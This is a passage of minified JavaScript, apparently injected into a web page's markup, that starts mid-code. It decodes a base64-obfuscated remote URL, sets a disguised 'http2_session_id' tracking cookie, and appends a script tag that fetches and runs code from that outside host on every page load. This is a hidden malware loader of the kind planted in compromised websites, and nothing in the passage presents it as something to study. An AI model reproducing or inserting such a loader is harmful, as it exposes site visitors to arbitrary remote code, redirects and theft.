u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
